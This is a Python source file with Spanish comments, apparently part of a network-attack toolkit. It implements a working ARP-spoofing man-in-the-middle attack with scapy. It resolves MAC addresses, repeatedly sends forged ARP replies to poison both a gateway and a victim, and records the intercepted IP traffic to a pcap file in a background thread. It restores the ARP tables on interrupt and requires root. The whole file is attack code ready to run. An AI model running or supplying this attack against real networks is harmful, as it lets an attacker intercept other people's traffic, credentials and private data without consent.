import scapy.all as scapy
import time
import os
import threading
from traffic_capture.capture import capture_traffic

# Función para verificar si se ejecuta con privilegios de root
def is_root():
    return os.geteuid() == 0


def get_mac(ip):
    """
    Obtiene la dirección MAC de una IP mediante una solicitud ARP.
    """
    try:
        request = scapy.ARP(pdst=ip) # Crea del paquete ARP para obtener la MAC de la IP destino
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        final_packet = broadcast / request
        
        # Envia el paquete y recibe la respuesta
        answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
        mac = answer[0][1].hwsrc
        return mac
    
    except Exception as e:
        print(f"[!] Error al obtener la MAC de {ip}: {str(e)}")
        return None


def spoofing(target_ip, spoofed_ip):
    """
    Envía paquetes ARP suplantando la identidad de 'spoofed_ip' hacia 'target_ip'.
    """
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"[!] No se puede continuar el ataque contra {target_ip}.")
        return

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)
    ethernet_packet = scapy.Ether(dst=target_mac) / packet
    scapy.sendp(ethernet_packet, verbose=False)

    
def restore_defaults(dest_ip, source_ip):
    """
    Restaura las tablas ARP de la víctima y el router a su estado original.
    """
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    if dest_mac is None or source_mac is None:
        print(f"[!] No se puede restaurar la tabla ARP para {dest_ip} o {source_ip}.")
        return
    
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    ethernet_packet = scapy.Ether(dst=dest_mac) / packet
    scapy.sendp(ethernet_packet, count=4, verbose=False)



def mitm_attack(gateway_ip, victim_ip):
    """
    Función principal del ataque MITM (Man-in-the-Middle) utilizando ARP spoofing.
    """
    print(f"[+] Iniciando ataque MITM entre {gateway_ip} y {victim_ip}...")

    stop_event = threading.Event() # Evento para detener un hilo

    try:
        # Se inicia la captura de tráfico en un hilo aparte
        capture_thread = threading.Thread(
            target=capture_traffic,
            kwargs={"filter": "ip", "output_file": "mitm_traffic.pcap", "stop_event": stop_event}
        )
        capture_thread.daemon = True
        capture_thread.start()

        while True:
            spoofing(gateway_ip, victim_ip)  # Suplantar al router frente a la víctima
            spoofing(victim_ip, gateway_ip)  # Suplantar a la víctima frente al router
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[!] Ataque interrumpido por el usuario. Espere un momento.")
        stop_event.set()  # Activar la señal para detener el hilo
        capture_thread.join()  # Esperar a que el hilo termine
        restore_defaults(gateway_ip, victim_ip)
        restore_defaults(victim_ip, gateway_ip)
        print("[+] Tablas ARP restauradas. Volviendo al menú principal.")


# Verificar si se está ejecutando como root
if not is_root():
    print("[!] Este ataque requiere privilegios de root.")
    exit(1)
